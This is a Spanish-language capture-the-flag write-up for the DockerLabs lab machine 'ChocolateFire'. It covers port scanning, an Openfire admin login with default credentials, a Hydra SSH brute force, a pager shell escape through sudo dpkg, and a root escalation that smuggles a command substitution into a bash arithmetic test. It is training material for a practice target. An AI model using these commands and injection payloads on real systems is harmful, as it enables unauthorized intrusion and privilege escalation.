# Writeup – ChocolateFire (DockerLabs)

**Plataforma:** DockerLabs  
**Sistema:** Debian (Docker)  
**IP:** 172.17.0.2  
**Objetivo:** Intrusión a la máquina y escalar privilegios hasta el usuario root

---

## 1. Reconocimiento

Se realiza un escaneo de puertos con Nmap para descubrir los servicios expuestos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
nmap -p22,5222,5223,5262,5263,5269,5270,5275,5276,7070,7777,9090 -sCV 172.17.0.2
```

### Puertos abiertos

| Puerto | Servicio | Versión / Detalle |
|--------|----------|-------------------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian |
| 5222/tcp | Jabber | Openfire (XMPP) |
| 5223/tcp | SSL | Openfire |
| 5262/tcp | Jabber | Openfire 3.10.0+ |
| 5263/tcp | SSL | Openfire |
| 5269/tcp | XMPP | Wildfire XMPP Client |
| 5270/tcp | XMPP | Openfire |
| 5275/tcp | Jabber | Openfire 3.10.0+ |
| 5276/tcp | SSL | Openfire |
| 7070/tcp | HTTP | Jetty — Openfire HTTP Binding |
| 7777/tcp | Socks5 | Sin autenticación |
| 9090/tcp | HTTP | Apache Hadoop (Openfire Admin) |

El servicio predominante es **Openfire 4.7.4**, un servidor XMPP (Jabber).

---

## 2. Acceso al panel de administración de Openfire

Se accede al panel vía web:

```
http://172.17.0.2:9090/login.jsp
```

Se utilizan las credenciales por defecto:

```
admin:admin
```

Dentro del panel se identifican tres usuarios con privilegios administrativos:

- `admin`
- `5laahb`
- `chocolatitochingon`

---

## 3. Fuerza bruta SSH

Se lanza Hydra contra el usuario `chocolatitochingon` usando el diccionario `rockyou.txt`.

```bash
hydra -l chocolatitochingon -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20 -I
```

**Resultado:**

```
[22][ssh] host: 172.17.0.2   login: chocolatitochingon   password: chocolate
```

Acceso a la máquina como `chocolatitochingon`.

---

## 4. Escalada horizontal — De `chocolatitochingon` a `pinguinacio`

Listando permisos sudo del usuario actual:

```bash
chocolatitochingon@97baf5f72976:~$ sudo -l
User chocolatitochingon may run the following commands:
    (pinguinacio) NOPASSWD: /usr/bin/dpkg
```

`chocolatitochingon` puede ejecutar `dpkg` como `pinguinacio` sin contraseña.

### Explotación

```bash
sudo -u pinguinacio /usr/bin/dpkg -l
```

`dpkg -l` muestra la salida a través de un paginador (`less`). Dentro del paginador se puede escapar a una shell ejecutando:

```
!/bin/bash
```

Esto otorga una shell interactiva como **pinguinacio**.

---

## 5. Escalación vertical — De `pinguinacio` a `root`

Nuevamente se verifican permisos sudo:

```bash
pinguinacio@97baf5f72976:~$ sudo -l
User pinguinacio may run the following commands:
    (ALL) NOPASSWD: /bin/bash /home/pinguinacio/script.sh
```

El script que se ejecuta como root:

```bash
#!/bin/bash
read -rp "Ingrese el número 1 para hacer un backup de tus archivos: " numero
if [[ "$numero" -eq 1 ]]
then
    cp * /opt
fi
```

### Vulnerabilidad

El script no sanitiza la entrada del usuario. La condición `[[ "$numero" -eq 1 ]]` evalúa la variable dentro de un contexto aritmético, donde Bash expande sustituciones de comandos **antes** de que la comparación falle.

### Explotación

Se introduce la siguiente cadena maliciosa como input:

```
a[$(/bin/bash >&2)]+1
```

Bash ejecuta `$(/bin/bash >&2)` durante la expansión de `[[ ]]`, lanzando una shell con privilegios de root.

```bash
pinguinacio@97baf5f72976:~$ sudo -u root /bin/bash /home/pinguinacio/script.sh
Ingrese el número 1 para hacer un backup de tus archivos: a[$(/bin/bash >&2)]+1
root@97baf5f72976:~# whoami
root
```

---

## Resumen de la intrusión

| Paso | Acción | Resultado |
|------|--------|-----------|
| 1 | Escaneo de puertos | Identificación de Openfire 4.7.4 |
| 2 | Login admin por defecto | Acceso al panel de Openfire |
| 3 | Hydra + rockyou | SSH como `chocolatitochingon:chocolate` |
| 4 | `dpkg -l` + `!/bin/bash` | Escalación a `pinguinacio` |
| 5 | Inyección en `[[ ]]` de bash | Escalación a **root** |

**Objetivo cumplido:** shell como root en el contenedor.
